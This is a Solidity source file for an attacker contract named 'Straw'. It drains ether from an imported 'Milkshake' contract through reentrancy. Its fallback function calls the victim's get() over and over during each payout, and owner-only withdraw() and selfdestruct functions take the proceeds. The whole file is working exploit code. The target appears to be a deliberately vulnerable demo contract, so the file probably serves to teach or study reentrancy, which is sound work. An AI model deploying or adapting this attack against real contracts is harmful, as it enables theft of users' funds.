pragma solidity ^0.5.0;

import "openzeppelin-solidity/contracts/ownership/Ownable.sol";

import "./Milkshake.sol";

/**
 * Attacker smart contract.
 * For any suggestions please contact me at andrei.dimitrief.jianu(at)gmail.com
 */
contract Straw is Ownable
{
    Milkshake private _milkshake;

    uint256 private _iteration;
    uint256 private _maxIterations;

    constructor (address payable milkshake) 
    public
    payable
    {
        _milkshake = Milkshake(milkshake);
    }

    function withdraw(address payable withdrawAddress, uint256 withdrawAmount)
    public
    onlyOwner
    {
        require(address(this).balance > withdrawAmount, "not enough funds");

        withdrawAddress.transfer(withdrawAmount);
    }

    function kill(address payable killAddress) 
    public
    onlyOwner
    {
        selfdestruct(killAddress);
    }

    function collect(uint256 maxIterations) 
    public 
    payable
    onlyOwner 
    {
        _iteration = 0;
        _maxIterations = maxIterations;

        _milkshake.put.value(msg.value)();
        _milkshake.get();
    }

    function () 
    external
    payable 
    {
        if (address(_milkshake).balance >= msg.value && _iteration < _maxIterations) 
        {
            _iteration += 1;

            _milkshake.get();
        }
    }
}
